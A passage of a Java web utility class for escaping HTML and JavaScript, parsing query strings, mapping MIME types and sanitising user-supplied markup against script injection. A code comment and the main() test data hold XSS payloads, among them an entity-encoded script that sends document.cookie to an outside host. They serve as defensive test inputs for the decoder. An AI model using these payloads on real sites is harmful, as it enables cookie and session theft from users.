        StringBuffer b = new StringBuffer(s.length()*2);
        b.append("document.write(\"");
        int i = 0;
        int j;
        for (i=0; i<s.length(); i++) {
            char c = s.charAt(i);
            switch (c) {
            case '\n': b.append("\");\ndocument.write(\""); break;
            case '\r': break;
            case '\"': b.append("\"\""); break;
            default: b.append(c);
            }
        }
        b.append("\");");
        return b.toString();
    }
    */

    /**
     * turn \r etc to <br/>
     */
    public static final String getStringAsHTMLString(String s) {
        if (s == null) {
            return null;
        }

        StringBuffer b = new StringBuffer(s.length() * 2);
        int i = 0;
        int j;
        for (i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            if (c > 127) {
                String hex = Integer.toHexString(c);
                while (hex.length() < 4) {
                    hex = "0" + hex;
                }
                b.append("\\u" + hex);
            } else {
                switch (c) {
                    case '\n':
                        b.append("<BR>");
                        break;
                    case '\b':
                        b.append("\\b");
                        break;
                    case '\t':
                        b.append("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;");
                        break;
                    case '\\':
                        b.append("\\\\");
                        break;
                    case '\"':
                        b.append("\\\"");
                        break;
                    case '\'':
                        b.append("\\\'");
                        break;
                    default:
                        b.append(c);
                }
            }
        }
        return b.toString();
    }

    /**
     * Parse a content-type header for the character encoding. If the
     * content-type is null or there is no explicit character encoding,
     * ISO-8859-1 is returned.
     *
     * @param contentType a content type header.
     */
    public static String parseCharacterEncoding(String contentType) {
        int start;
        int end;

        if ((contentType == null) || ((start = contentType.indexOf("charset="))) == -1) {
            //pbreturn JServDefs.ENCODING;
            return "ISO-8859-1";
        }

        String encoding = contentType.substring(start + 8);

        if ((end = encoding.indexOf(";")) > -1) {
            return encoding.substring(0, end);
        } else {
            return encoding;
        }
    }

    public static class HTTPRequestResult {
        public String header;
        public String body;
        public String rawText;
        public String ianaCharset;
        public boolean isGZIPResult;
        int bodyLength = -1;
        public byte rawBytes[];
        public byte bodyRawBytes[];
        public byte bodyRawBytesWithoutAnyGziping[];
        public java.sql.Timestamp lastModified;
        public String mimeType;
    }

    public static final String MIME_TYPE_TEXT_JAVASCRIPT = "text/javascript";
    public static final String MIME_TYPE_TEXT_XML = "text/xml";
    public static final String MIME_TYPE_APPLICATION_XML = "application/xml";
    public static final String MIME_TYPE_APPLICATION_XSLT_XML = "application/xslt+xml";

    /**
     * determine if the specified mime type is an XML mime type
     *
     * @param mimeType the mime type to test
     * @return true if the specified mime type is an XML mime type.
     * tests for both text/xml and application/xml.
     */
    public static boolean isXMLMimeType(String mimeType) {
        return IPUtil.isEqual(mimeType, MIME_TYPE_TEXT_XML) || IPUtil.isEqual(mimeType, MIME_TYPE_APPLICATION_XML);
    }

    static Map<String, Set<String>> MIME_TYPES = new HashMap<String, Set<String>>();
    static BitSet s_hexBitSet = new BitSet();

    static {
        setDefaultMimeTypes();
        s_hexBitSet.set('a');
        s_hexBitSet.set('b');
        s_hexBitSet.set('c');
        s_hexBitSet.set('d');
        s_hexBitSet.set('e');
        s_hexBitSet.set('f');
        s_hexBitSet.set('A');
        s_hexBitSet.set('B');
        s_hexBitSet.set('C');
        s_hexBitSet.set('D');
        s_hexBitSet.set('E');
        s_hexBitSet.set('F');
    }

    public static void setDefaultMimeTypes() {
        // Text
        addMimeType("html", "text/html");
        addMimeType("xsl", MIME_TYPE_TEXT_XML);
        addMimeType("xml", MIME_TYPE_TEXT_XML);
        addMimeType("htm", "text/html");
        addMimeType("txt", "text/plain");
        addMimeType("css", "text/css");
        addMimeType("sgml", "text/x-sgml");
        addMimeType("sgm", "text/x-sgml");
        // Image
        addMimeType("gif", "image/gif");
        addMimeType("jpg", ImageInfoType.FORMAT_JPEG.getMimeType());
        addMimeType("jpeg", ImageInfoType.FORMAT_JPEG.getMimeType());
        addMimeType("jpe", ImageInfoType.FORMAT_JPEG.getMimeType());
        addMimeType("png", "image/png");
        addMimeType("tif", ImageInfoType.FORMAT_JPEG.getMimeType());
        addMimeType("tiff", "image/tiff");
        addMimeType("rgb", "image/x-rgb");
        addMimeType("xbm", "image/x-xbitmap");
        addMimeType("xpm", "image/x-xpixmap");
        // Audio
        addMimeType("au", "audio/basic");
        addMimeType("aac", "audio/x-aac", "audio/aac");
        addMimeType("snd", "audio/basic");
        addMimeType("mid", "audio/mid");
        addMimeType("midi", "audio/mid");
        addMimeType("rmi", "audio/mid");
        addMimeType("kar", "audio/mid");
        addMimeType("mpga", "audio/mpeg");
        addMimeType("mp2", "audio/mpeg");
        addMimeType("mp3", "audio/mpeg", "audio/mp3");
        addMimeType("m4a", "audio/mp4a-latm", "audio/mp4");
        addMimeType("wav", "audio/wav");
        addMimeType("aiff", "audio/aiff");
        addMimeType("aifc", "audio/aiff");
        addMimeType("aif", "audio/x-aiff");
        addMimeType("wma", "audio/x-ms-wma");
        addMimeType("ra", "audio/x-realaudio");
        addMimeType("ram", "audio/x-pn-realaudio");
        addMimeType("rpm", "audio/x-pn-realaudio-plugin");
        addMimeType("sd2", "audio/x-sd2");
        // Application
        addMimeType("bin", "application/octet-stream");
        addMimeType("dms", "application/octet-stream");
        addMimeType("lha", "application/octet-stream");
        addMimeType("lzh", "application/octet-stream");
        addMimeType("exe", "application/octet-stream");
        addMimeType("class", "application/octet-stream");
        addMimeType("hqx", "application/mac-binhex40");
        addMimeType("ps", "application/postscript");
        addMimeType("ai", "application/postscript");
        addMimeType("eps", "application/postscript");
        addMimeType("pdf", "application/pdf");
        addMimeType("rtf", "application/rtf");
        addMimeType("doc", "application/msword");
        addMimeType("ppt", "application/powerpoint");
        addMimeType("fif", "application/fractals");
        addMimeType("p7c", "application/pkcs7-mime");
        // Application/x
        addMimeType("js", "application/x-javascript");
        addMimeType("z", "application/x-compress");
        addMimeType("gz", "application/x-gzip");
        addMimeType("tar", "application/x-tar");
        addMimeType("tgz", "application/x-compressed");
        addMimeType("zip", "application/x-zip-compressed");
        addMimeType("dir", "application/x-director");
        addMimeType("dcr", "application/x-director");
        addMimeType("dxr", "application/x-director");
        addMimeType("dvi", "application/x-dvi");
        addMimeType("tex", "application/x-tex");
        addMimeType("latex", "application/x-latex");
        addMimeType("tcl", "application/x-tcl");
        addMimeType("cer", "application/x-x509-ca-cert");
        addMimeType("crt", "application/x-x509-ca-cert");
        addMimeType("der", "application/x-x509-ca-cert");
        // Video
        addMimeType("mpg", "video/mpeg");
        addMimeType("mpe", "video/mpeg");
        addMimeType("mpeg", "video/mpeg");
        addMimeType("qt", "video/quicktime");
        addMimeType("mov", "video/quicktime");
        addMimeType("avi", "video/x-msvideo");
        addMimeType("movie", "video/x-sgi-movie");
        addMimeType("3gp", "video/3gpp");
        addMimeType("wmv", "video/x-ms-wmv");
        addMimeType("divx", "video/x-divx");
        addMimeType("flv", "video/x-flv");
        addMimeType("m4v", "video/x-m4v");
        addMimeType("mp4", "video/mp4");
        // Chemical
        addMimeType("pdb", "chemical/x-pdb");
        addMimeType("xyz", "chemical/x-pdb");
        // X-
        addMimeType("ice", "x-conference/x-cooltalk");
        addMimeType("wrl", "x-conference/x-cooltalk");
        addMimeType("vrml", "x-world/x-vrml");

        addMimeType("wml", "text/vnd.wap.wml");
        addMimeType("wmlc", "application/vnc.wap.wmlc");
    }

    private static void addMimeType(String extension, String... mimeTypes) {
        assert !MIME_TYPES.containsKey(extension) : "Should never register the same file extension multiple times!";
        MIME_TYPES.put(extension, Collections.unmodifiableSet(newLinkedHashSet(mimeTypes)));
    }

    public static Set<String> getMimeTypesForFileExtension(String extension) {
        return MIME_TYPES.get(extension);
    }

    public static Map<String, String[]> parseQueryStringWithArrayOfValues(String s) {
        Map<String, String[]> ret = new LinkedHashMap<String, String[]>();
        StringTokenizer st = new StringTokenizer(s, "&");
        while (st.hasMoreTokens()) {
            String pair = st.nextToken();
            int pos = pair.indexOf('=');
            if (pos == -1) {
                // XXX
                // should give more detail about the illegal argument
                throw new IllegalArgumentException();
            }
            String key = getURLDecodedString(pair.substring(0, pos));
            String val = getURLDecodedString(pair.substring(pos + 1, pair.length()));

            String[] valArray;
            if (ret.containsKey(key)) {
                String[] oldVals = ret.get(key);
                Collection<String> newVals = new ArrayList<String>(oldVals.length + 1);
                for (String oldVal : oldVals) {
                    newVals.add(oldVal);
                }
                newVals.add(val);
                valArray = newVals.toArray(new String[]{});
            } else {
                valArray = new String[]{val};
            }
            ret.put(key, valArray);
        }
        return ret;
    }

    /**
     * parse a query string into a Properties object. if there are duplicate parameters,
     * only the last parameter will be used, so don't use this if you potentially need to
     * support multiple parameters with the same name.
     *
     * @return a Properties object mapping keys to values for the specified query string.
     */
    public static Properties parseQueryStringAsProperties(String s) {
        Properties ret = new Properties();
        if (IPStringUtil.isEmpty(s)) {
            return ret;
        }
        StringTokenizer st = new StringTokenizer(s, "&");
        while (st.hasMoreTokens()) {
            String pair = st.nextToken();
            int pos = pair.indexOf('=');
            if (pos == -1) {
                // skip this one if there is no '='
                continue;
            }
            String key = getURLDecodedString(pair.substring(0, pos));
            String val = getURLDecodedString(pair.substring(pos + 1, pair.length()));

            ret.setProperty(key, val);
        }
        return ret;
    }

    /**
     * @return a Map mapping keys to values for the specified query string.
     */
    public static Map<String, Collection<String>> parseQueryString(String s) {
        return parseQueryString(s, false);
    }

    public static Map<String, String> parseQueryStringWithSingleValues(String s) {
        return parseQueryString(s, true);
    }

    private static Map parseQueryString(String s, boolean singleStringValues) {
        Map ret = new LinkedHashMap();
        if (IPStringUtil.isEmpty(s)) {
            return ret;
        }
        StringTokenizer st = new StringTokenizer(s, "&");
        while (st.hasMoreTokens()) {
            String pair = st.nextToken();
            int pos = pair.indexOf('=');
            if (pos == -1) {
                // skip this one if there is no '='
                continue;
            }
            String key = getURLDecodedString(pair.substring(0, pos));
            String val = getURLDecodedString(pair.substring(pos + 1, pair.length()));

            if (singleStringValues) {
                ret.put(key, val);
            } else {
                Collection<String> col = (Collection<String>) ret.get(key);
                if (col == null) {
                    ret.put(key, col = new HashSet<String>());
                }
                col.add(val);
            }
        }
        return ret;
    }

    private static final Pattern BACKSLASH_PATTERN = Pattern.compile("\\", Pattern.LITERAL);
    // bl: want to replace a \ with a \\ for javascript strings
    private static final String BACKSLASH_REPLACEMENT = Matcher.quoteReplacement("\\\\");
    private static final Pattern QUOTE_PATTERN = Pattern.compile("\"");
    // bl: want to replace a " with a \" for javascript strings.
    private static final String QUOTE_REPLACEMENT = Matcher.quoteReplacement("\\\"");
    private static final Pattern APOSTROPHE_PATTERN = Pattern.compile("'");
    // bl: want to replace a ' with a \' for javascript strings.
    private static final String APOSTROPHE_REPLACEMENT = Matcher.quoteReplacement("\\'");
    private static final Pattern NEWLINE_PATTERN = Pattern.compile("\n", Pattern.LITERAL);
    // bl: want to replace a '\n' character with the string "\n\" followed by the '\n' so that javascript will interpret it as a newline.
    // bl: newlines aren't allowed in JSON strings, so to make this JSON-compatible, we'll just replace newline characters with a "\n" in the javascript string literal.
    private static final String NEWLINE_REPLACEMENT = Matcher.quoteReplacement("\\n");
    private static final Pattern TAB_PATTERN = Pattern.compile("\t", Pattern.LITERAL);
    private static final String TAB_REPLACEMENT = Matcher.quoteReplacement("\\t");

    // jw: we need to escape closing script tags inside of javascript literal strings. See http://stackoverflow.com/a/4404879
    private static final Pattern CLOSING_SCRIPT_PATTERN = Pattern.compile("</script>", Pattern.LITERAL | Pattern.CASE_INSENSITIVE);
    private static final String CLOSING_SCRIPT_REPLACEMENT = Matcher.quoteReplacement("<\\/script>");

    /**
     * escape a string for use in a javascript literal string.  escape quotes should be true
     * if the string is delimited with quotes.  it should be false if the string is delimited
     * with apostrophes.
     *
     * @param javascriptString the string to convert to a javascript literal string
     * @param escapeQuotes     true if the string is delimited with quotes.  false if it is delimited with apostrophes.
     * @return the string with all proper escapes for use in a javascript literal string
     */
    public static String getJavascriptLiteralStringFromString(String javascriptString, boolean escapeQuotes) {
        if (IPStringUtil.isEmpty(javascriptString)) {
            return javascriptString;
        }
        javascriptString = BACKSLASH_PATTERN.matcher(javascriptString).replaceAll(BACKSLASH_REPLACEMENT);
        if (escapeQuotes) {
            javascriptString = QUOTE_PATTERN.matcher(javascriptString).replaceAll(QUOTE_REPLACEMENT);
        } else {
            javascriptString = APOSTROPHE_PATTERN.matcher(javascriptString).replaceAll(APOSTROPHE_REPLACEMENT);
        }
        // convert all newlines sequences into just \n
        javascriptString = HtmlTextMassager.convertNewlineSequencesToCarriageReturns(javascriptString);
        // now, in order to continue a string onto multiple lines, the line must end with a backslash
        javascriptString = NEWLINE_PATTERN.matcher(javascriptString).replaceAll(NEWLINE_REPLACEMENT);
        javascriptString = TAB_PATTERN.matcher(javascriptString).replaceAll(TAB_REPLACEMENT);
        javascriptString = CLOSING_SCRIPT_PATTERN.matcher(javascriptString).replaceAll(CLOSING_SCRIPT_REPLACEMENT);
        return javascriptString;
    }

    /**
     * Convert a string so it can be included in Java source code,
     * by replacing each special character with an escape sequence
     */

    public static String getJavaEscapedString(String s) {
        if (s == null) {
            return "";
        }

        StringBuffer b = new StringBuffer(s.length() * 2);
        int i = 0;
        int j;
        for (i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            if (c > 127) {
                String dec = Integer.toString(c);
                b.append("&#" + dec + ';');
            } else {
                switch (c) {
                    case '\n':
                        b.append("\\n");
                        break;
                    case '\r':
                        b.append("\\r");
                        break;
                    case '\b':
                        b.append("\\b");
                        break;
                    case '\t':
                        b.append("\\t");
                        break;
                    case '\\':
                        b.append("\\\\");
                        break;
                    case '\"':
                        b.append("\\\"");
                        break;
                    case '\'':
                        b.append("\\\'");
                        break;
                    default:
                        b.append(c);
                }
            }
        }
        return b.toString();
    }

    public static String getStringAsDocumentWrites(String text) {
        if (text == null) {
            return null;
        }
        if (text.length() == 0) {
            return null;
        }
        StringBuffer out = new StringBuffer(text.length() * 2);
        out.append("document.write(\'");
        int i = 0;
        int j;
        int appendFrom = 0;
        char input[] = text.toCharArray();
        for (i = 0; i < input.length; i++) {
            char c = input[i];
            String append = null;
            if (c > 127) {
                String dec = Integer.toString(c);
                append = "&#" + dec + ';';
            } else {
                switch (c) {
                    // newline
                    case '\n':
                        append = "\\n";
                        break;
                    // carriage return
                    case '\r':
                        append = "\\r";
                        break;
                    // back space
                    case '\b':
                        append = "\\b";
                        break;
                    //tab
                    case '\t':
                        append = "\\t";
                        break;
                    case '\\':
                        append = "\\\\";
                        break;
                    //case '\"': append = "\\\"";break;
                    case '\'':
                        append = "\\'";
                        break;
                    //case '-': append = "-' + '";break;
                    default:
                        break;
                }
            }
            // line break
            if (i % 100 == 0 && i != 0) {
                if (append == null) {
                    append = "');\ndocument.write('";
                    append += c;
                } else {
                    append += "');\ndocument.write('";
                }
            }
            if (append != null) {
                int len = i - appendFrom;
                if (len > 0) {
                    out.append(input, appendFrom, len);
                }
                out.append(append);
                appendFrom = i + 1;
            }
        }
        if (appendFrom != input.length) {
            int len = input.length - appendFrom;
            if (len > 0) {
                out.append(input, appendFrom, len);
            }
        }
        out.append("\');\n");
        return out.toString();
    }

    /*
    public static final String getStringAsDocumentWrites(StringBuffer sb) {
        if (sb==null) return null;
        if(sb.length()==0)
            return null;
        int iOutIndex=0;
        int i = 0;
        int j;
        char input[] = new char[sb.length()];
        sb.getChars(0, sb.length(), input, 0);
        //Alias.convertToCharArray(s);
        for (i=0; i<input.length; i++) {
            char c = input[i];
            {
                         switch (c) {
                         case '\n': out[iOutIndex++]='\\';out[iOutIndex++]='n'; break;
                         case '\r': out[iOutIndex++]='\\';out[iOutIndex++]='r'; break;
                         case '\b': out[iOutIndex++]='\\';out[iOutIndex++]='b'; break;
                         case '\t': out[iOutIndex++]='\\';out[iOutIndex++]='t'; break;
                         case '\\': out[iOutIndex++]='\\';out[iOutIndex++]='\\'; break;
                         case '\"': out[iOutIndex++]='\\';out[iOutIndex++]='\"'; break;
                         case '\'': out[iOutIndex++]='\\';out[iOutIndex++]='\''; break;
                         default: out[iOutIndex++]=c;
                         }
                     }
        }
        return new String(out, 0, iOutIndex);
    }
    */
    public static String cleanDomainName(String domainName) {
        if (domainName == null) {
            domainName = "";
        }
        // lookups are case sensitive, keep everything inlower case
        domainName = domainName.toLowerCase();
        // we really want just the plain domain name
        domainName = IPStringUtil.getStringAfterStripFromStart(domainName, "http://");
        domainName = IPStringUtil.getStringAfterStripFromEnd(domainName, "/");
        return domainName;
    }

    /**
     * @return the string with ascii html entities converted to ascii
     * and all HTML tags converted to & gt ; etc.
     */
    public static String getNeuteredHTMLString(String s) {
        // Convert javascript and other baddies written as html entities back to regular text
        s = IPHTMLUtil.getDeHTMLEntityizedString(s, true);
        return HtmlTextMassager.disableHtml(s);
    }

    /**
     * Return the supplied text 'safe'.
     * Note: Disables any HTML and scripts.
     */
    public static String getSafeHTMLString(String text) {
        if (IPStringUtil.isEmpty(text)) {
            return text;
        }

        // Convert javascript and other baddies written as html entities back to regular text
        text = IPHTMLUtil.getDeHTMLEntityizedString(text, true);
        // Disable any HTML
        text = HtmlTextMassager.disableHtml(text);
        // They may have used URL encoded chars in their HTML tags to do harmful things.  decode those vals so we can
        // catch them in the script tag/function killing.
        text = IPHTMLUtil.decodeURLEncodedCharactersInHTMLTags(text);
        // They might have used URL encoded chars to write html entities.  so we have to call one of these
        // guys twice no matter what.  d'oh.
        text = IPHTMLUtil.getDeHTMLEntityizedString(text, true);
        text = HtmlTextMassager.killScriptTags(text);
        text = HtmlTextMassager.killScriptFunctions(text);
        return text;
    }

    private static final Map<Pattern, String> URL_SANITIZATION_PATTERN_TO_REPLACEMENT;

    static {

        Map<Pattern, String> tempMap = new HashMap<Pattern, String>();
        // Unsafe Characters (http://www.blooberry.com/indexdot/html/topics/urlencoding.htm)
        tempMap.put(Pattern.compile(" ", Pattern.LITERAL), "%20");
        tempMap.put(Pattern.compile("\'", Pattern.LITERAL), "%22");
        tempMap.put(Pattern.compile("\"", Pattern.LITERAL), "%22");
        tempMap.put(Pattern.compile("<", Pattern.LITERAL), "%3C");
        tempMap.put(Pattern.compile(">", Pattern.LITERAL), "%3E");
        // jw: bypassing to allow vertical page anchors
        //tempMap.put(Pattern.compile("#", Pattern.LITERAL), "%23");
        tempMap.put(Pattern.compile("{", Pattern.LITERAL), "%7B");
        tempMap.put(Pattern.compile("}", Pattern.LITERAL), "%7D");
        tempMap.put(Pattern.compile("|", Pattern.LITERAL), "%7C");
        tempMap.put(Pattern.compile("\\", Pattern.LITERAL), "%5C");
        tempMap.put(Pattern.compile("^", Pattern.LITERAL), "%5E");
        tempMap.put(Pattern.compile("~", Pattern.LITERAL), "%7E");
        tempMap.put(Pattern.compile("[", Pattern.LITERAL), "%5B");
        tempMap.put(Pattern.compile("]", Pattern.LITERAL), "%5D");
        tempMap.put(Pattern.compile("`", Pattern.LITERAL), "%60");
        URL_SANITIZATION_PATTERN_TO_REPLACEMENT = Collections.unmodifiableMap(tempMap);
    }

    /**
     * Removes all risky characters from URLs to help prevent javascript.
     *
     * @param url The URL that we want to sanitize
     * @return The now sanitized URL
     */
    public static String getSanitizedUrl(String url) {
        if (url == null) {
            return null;
        }
        url = url.trim();

        for (Map.Entry<Pattern, String> entry : URL_SANITIZATION_PATTERN_TO_REPLACEMENT.entrySet()) {
            url = entry.getKey().matcher(url).replaceAll(entry.getValue());
        }

        return url;
    }

    /**
     * returns a string after converting entities (currently only numeric
     * entities) to regular chars
     *
     * @justReplaceAsciiEntites when true only converts entities in the
     * 32 - 126 range back into chars (e.g. most keywords, <, >.  i.e. the
     * dangerous ones)
     */
    public static String getDeHTMLEntityizedString(String s, boolean justReplaceAsciiEntites) {
        if (IPStringUtil.isEmpty(s)) {
            return s;
        }
        StringBuffer ret = null;
        int startOfCharsToBeAdded = 0;
        boolean wasEntityFound = false;
        char chars[] = s.toCharArray();
        outer:
        for (int i = 0; i < chars.length; i++) {
            /*
            er, but this needs to happen inside urls only...
            // get rid of ascii url encoding also
            do {
                if(chars[i]!='%')
                    break;
                 if(i+2<chars.length)
                     break;
                 if(!Alias.hexDigits.get(chars[i+1])
                    break;
                 if(!Alias.hexDigits.get(chars[i+2])
                    break;
                 int val = Integer.parseInt(new String(chars, i+1, 2),16)
                 if(val<32 || entityChar>=127) {
                     continue;
                 }
            } while(  );
            */
            if (chars[i] != '&') {
                continue;
            }
            int startOfEntity = i;
            int j = i;
            if (++j >= chars.length) {
                continue;
            }
            boolean isNumber = chars[j] == '#';
            if (!isNumber) {
                continue;
            }
            if (++j >= chars.length) {
                continue;
            }

            boolean isHex = chars[j] == 'x' || chars[j] == 'X';
            if (isHex) {
                if (++j >= chars.length) {
                    continue;
                }
            }

            int startOfDigit = j;
            boolean needPushBack = false;
            inner:
            for (; ; j++) {
                if (j >= chars.length) {
                    if (j <= startOfDigit) {
                        // no number started, just ignore
                        break outer;
                    }
                    needPushBack = true;
                    break inner;
                }
                char digit = chars[j];
                if (digit == ';') {
                    break inner;
                }
                if (Character.isDigit(digit)) {
                    continue inner;
                }
                if (isHex && s_hexBitSet.get(digit)) {
                    continue inner;
                }
                // not a digit or ;, not an entity
                // so push a char back on the stack
                if (j <= startOfDigit) {
                    // no number started, just ignore
                    continue outer;
                }
                needPushBack = true;
                // continue outer;
                // the above code would be fine.  But the browsers 'go easy'
                // on what they find acceptable.  too easy.
                // e.g. this line will give up your cookie:
                // <A HREF="http://localhost" onMouseDown="alert&#40document.cookie);" TARGET=_blank>click me?</A>
                break inner;
            }
            String num = new String(chars, startOfDigit, j - startOfDigit);
            try {
                int entityChar = Integer.parseInt(num, isHex ? 16 : 10);
                // pb: leave &#153; as is so as to not upset brian
                if (justReplaceAsciiEntites && (entityChar < 32 || entityChar >= 127)) {
                    continue;
                }

                if (ret == null) {
                    ret = new StringBuffer(s.length());
                }
                int unpublishedChars = startOfEntity - startOfCharsToBeAdded;
                if (unpublishedChars > 0) {
                    ret.append(chars, startOfCharsToBeAdded, unpublishedChars);
                }
                ret.append((char) entityChar);
                wasEntityFound = true;
                startOfCharsToBeAdded = j + 1 + (needPushBack ? -1 : 0);
                // and for loop will immediately increment it
                i = j + (needPushBack ? -1 : 0);
                continue outer;
            } catch (NumberFormatException nfe) {
                // not a number
                continue outer;
            }
        }
        // nothing changed
        if (startOfCharsToBeAdded == 0) {
            return s;
        }
        int unpublishedChars = chars.length - startOfCharsToBeAdded;
        if (unpublishedChars > 0) {
            ret.append(chars, startOfCharsToBeAdded, unpublishedChars);
        }
        // if something had changed, then the text may have been using entities to write enties.
        // so let's trump them and keep going until we get a clean string
        return getDeHTMLEntityizedString(ret.toString(), true);
    }

    public static String getHtmlEntityForCharacter(char character) {
        return newString("&#", (int) character, ";");
    }

    /**
     * bl: URL encoded characters may be found in attribute values in HTML.
     * this can impose a security risk by allowing users to bypass the
     * de-scripting done on message processing.  so, before de-scripting a message,
     * pass it through this filter to recursively decoded URL encoded characters.
     * handles both %xx and %uxxxx form of url encoded chars.
     */
    public static String decodeURLEncodedCharactersInHTMLTags(String msg) {
        if (IPStringUtil.isEmpty(msg)) {
            return msg;
        }

        StringBuffer ret = new StringBuffer();
        boolean hasMadeReplacement = false;
        char[] msgCharArray = msg.toCharArray();
        int searchIndex = 0;
        int firstCharOfContentNotYetUsed = 0;

        lookingforopenhtmltagloop:
        do {
            int iStartOfTag = 0;
            int iEndOfTag = 0;
            {
                Alias.MatchResult startMatch = Alias.getMatchResult(msgCharArray, searchIndex, msgCharArray.length, new char[][]{"<".toCharArray()}, null, -1);
                // no open tag found?  we're done!
                if (startMatch == null) {
                    break lookingforopenhtmltagloop;
                }
                // start searching from this point forward
                iStartOfTag = startMatch.foundIndex;
                searchIndex = startMatch.afterMatchIndex;
            }
            {
                Alias.MatchResult endMatch = Alias.getMatchResult(msgCharArray, searchIndex, msgCharArray.length, new char[][]{">".toCharArray()}, null //new char[][] {"<".toCharArray()}
                        , -1);
                // no end tag found?  well, then, see ya!
                if (endMatch == null) {
                    break lookingforopenhtmltagloop;
                }
                // found an html tag.  set the searchIndex so we can look for the comment.
                iEndOfTag = endMatch.foundIndex;
            }

            // found an html tag, now we need to look for any % characters in the tag.
            // instead of trying to parse attribute names/values, just do the % decoding
            // in the entire string contained within the html tag.
            // implication: if your attribute name has a % in it, then it will be escaped.
            lookingforencodedcharloop:
            do {
                int iStartEncodedChar = 0;
                int iStartEncodedCharHexVal = 0;
                boolean isUnicodeChar = false;
                {
                    Alias.MatchResult encodedCharMatch = Alias.getMatchResult(msgCharArray, searchIndex, iEndOfTag - 1, new char[][]{"%".toCharArray()}, null, -1);
                    // no % found?  safe html tag then.  continue on :)
                    if (encodedCharMatch == null) {
                        // be sure to advance the searchIndex past this tag
                        searchIndex = iEndOfTag + 1;
                        break lookingforencodedcharloop;
                    }
                    iStartEncodedChar = encodedCharMatch.foundIndex;
                    iStartEncodedCharHexVal = encodedCharMatch.afterMatchIndex;
                    // check if this is a unicode encoded char
                    if (msgCharArray[iStartEncodedCharHexVal] == 'u' || msgCharArray[iStartEncodedCharHexVal] == 'U') {
                        isUnicodeChar = true;
                        iStartEncodedCharHexVal++;
                    }
                    searchIndex = iStartEncodedCharHexVal + (isUnicodeChar ? 4 : 2);
                    if ((searchIndex - 1) >= iEndOfTag) {
                        // encoded char goes past the end of the tag?  then invalid char, so just start looking for another tag.
                        break lookingforencodedcharloop;
                    }
                }
                String replacement = null;
                try {
                    if (isUnicodeChar) {
                        char charVal = (char) Integer.parseInt(new String(msgCharArray, iStartEncodedCharHexVal, 4), 16);
                        // only want to replace out an open paren and alphabetic characters
                        if (charVal == '(' || (charVal >= 'A' && charVal <= 'Z') || (charVal >= 'a' && charVal <= 'z')) {
                            replacement = new String(new char[]{charVal});
                        }
                    } else {
                        byte byteVal = (byte) Integer.parseInt(new String(msgCharArray, iStartEncodedCharHexVal, 2), 16);
                        // only want to replace out an open paren and alphabetic characters
                        if (byteVal == (byte) '(' || (byteVal >= (byte) 'A' && byteVal <= (byte) 'Z') || (byteVal >= (byte) 'a' && byteVal <= (byte) 'z')) {
                            replacement = new String(new byte[]{byteVal});
                        }
                    }
                } catch (NumberFormatException nfe) {
                    // oops, not a valid encoding.  leave it encoded, then by skipping it. (replacement==null)
                }
                // nothing to replace?  then just continue
                if (replacement == null) {
                    // move the search index back to right past the '%' or "%u"
                    searchIndex = iStartEncodedCharHexVal;
                    continue lookingforencodedcharloop;
                }
                // if the start of the current escaped char was past the current starting point,
                // then we need to append the unused portion to the buf.
                if (firstCharOfContentNotYetUsed < iStartEncodedChar) {
                    int size = iStartEncodedChar - firstCharOfContentNotYetUsed;
                    ret.append(msgCharArray, firstCharOfContentNotYetUsed, size);
                }
                ret.append(replacement);
                hasMadeReplacement = true;
                firstCharOfContentNotYetUsed = searchIndex;
            } while (true); // lookingforencodedcharloop (inside element)
        } while (true);

        // check if we stopped before the end of the message.  if so, append on the remaining part.
        if (firstCharOfContentNotYetUsed <= msgCharArray.length - 1) {
            ret.append(msgCharArray, firstCharOfContentNotYetUsed, msgCharArray.length - firstCharOfContentNotYetUsed);
        }

        // if something changed, then they may be using url encoded chars to write url encoded chars.
        // so, we'll need to call this method recursively until no changes were made.
        if (hasMadeReplacement) {
            return decodeURLEncodedCharactersInHTMLTags(ret.toString());
        }

        return ret.toString();
    }

    public static void main(String args[]) {
        System.out.println("string " + getJavascriptLiteralStringFromString("\\hello'hi\\'", false));
        if (true) {
            return;
        }
        IPUtil.uninterruptedSleep(2000);
        String testData[][] = new String[][]{{"<a href=\"%c0%af\">", "<a href=\"%c0%af\">"} // remains the same cause its not an alpha num that is encoded
                , {"alert&#40document.cookie", "alert(document.cookie"}, {"&#105;&#102;&#040;&#100;&#111;&#099;&#117;&#109;&#101;&#110;&#116;&#046;&#104;&#097;&#099;&#107;&#046;&#104;&#097;&#099;&#107;&#101;&#100;&#032;&#061;&#061;&#032;&#039;&#102;&#097;&#108;&#115;&#101;&#039;&#041;&#123;&#032;&#100;&#111;&#099;&#117;&#109;&#101;&#110;&#116;&#046;&#104;&#097;&#099;&#107;&#046;&#115;&#114;&#099;&#032;&#061;&#032;&#039;&#104;&#116;&#116;&#112;&#058;&#047;&#047;&#119;&#119;&#119;&#046;&#097;&#110;&#116;&#105;&#045;&#102;&#108;&#097;&#115;&#104;&#046;&#099;&#111;&#046;&#117;&#107;&#047;&#105;&#109;&#097;&#103;&#101;&#115;&#047;&#115;&#112;&#097;&#099;&#101;&#114;&#046;&#103;&#105;&#102;&#063;&#039;&#032;&#043;&#032;&#100;&#111;&#099;&#117;&#109;&#101;&#110;&#116;&#046;&#099;&#111;&#111;&#107;&#105;&#101;&#059;&#032;&#100;&#111;&#099;&#117;&#109;&#101;&#110;&#116;&#046;&#104;&#097;&#099;&#107;&#046;&#104;&#097;&#099;&#107;&#101;&#100;&#032;&#061;&#032;&#039;&#116;&#114;&#117;&#101;&#039;&#059;&#125;", "if(document.hack.hacked == 'false'){ document.hack.src = 'http://www.anti-flash.co.uk/images/spacer.gif?' + document.cookie; document.hack.hacked = 'true';}"}, {null, null}, {"", ""}, {"abc", "abc"}, {"abc&#00057;", "abc9"}, {"abc&#x00039;", "abc9"}, {"abc&#x39;", "abc9"}, {"abc&#x39", "abc9"}, {"&#x39;abc", "9abc"}, {"a&#153;a", "a&#153;a"}, {"", ""}, {"&#", "&#"}, {"&#40", "("}, {"&#&#40", "&#("}, {"&&#40", "&("}, {"&#x28", "("}, {"%28%63%6f%6F%6B%69%65", "%28%63%6f%6F%6B%69%65"}, {"<%28>", "<(>"}, {"< %41%42%43 >", "< ABC >"}, {"<%61%62%63>", "<abc>"}, {"<a href=\"%63%6f%6F%6B%69%65\">", "<a href=\"cookie\">"}, {"<%63%6%66%6%46%6%42%69%65>", "<cookie>"}, {"<&#37;63&#37;6f&#37;6F&#37;6B&#37;69&#37;65>", "<cookie>"}, {"<%26%23>", 